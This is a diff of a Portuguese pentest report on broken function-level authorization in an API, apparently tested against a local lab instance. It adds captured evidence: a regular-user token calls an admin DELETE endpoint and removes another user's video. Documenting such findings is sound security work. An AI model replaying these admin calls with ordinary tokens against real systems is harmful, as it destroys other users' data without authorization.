@@ -27,11 +27,23 @@ Authorization: Bearer <token_de_usuario_comum>
 
 2. Se a função executar com sucesso (ex.: vídeo de outro usuário deletado) usando um token **sem** papel de admin, a autorização em nível de função está quebrada.
 
-> **Confirmar na instância:** o caminho exato do endpoint de admin deve ser validado — testar variações (`/admin/`, outra versão de API) e observar a diferença de comportamento entre a rota de usuário e a de admin.
-
 ## 4. Evidência
 
-> _A preencher após execução._ Print salvo em `evidencias/06-bfla/`. Mostrar: (a) o token usado é de um usuário comum (payload JWT sem role de admin) e (b) a chamada à função administrativa retornando sucesso e produzindo efeito (recurso de outro usuário alterado/removido).
+**Confirmado contra a instância local** — captura em [`evidencias/06-bfla/captura.txt`](../../evidencias/06-bfla/captura.txt).
+
+```
+# token do atacante tem role comum:
+GET /identity/api/v2/user/dashboard  ->  "role":"ROLE_USER"
+
+# atacante (ROLE_USER) chama a função de admin sobre o vídeo da VÍTIMA:
+DELETE /identity/api/v2/admin/videos/6
+Authorization: Bearer <token_do_atacante>
+
+HTTP 200
+{"message":"User video deleted successfully.","status":200}
+```
+
+Após a chamada, o dashboard da vítima passou a mostrar `video_id: 0` (vídeo removido). Uma função administrativa foi executada por um usuário comum.
 
 ## 5. Por que é um risco
 
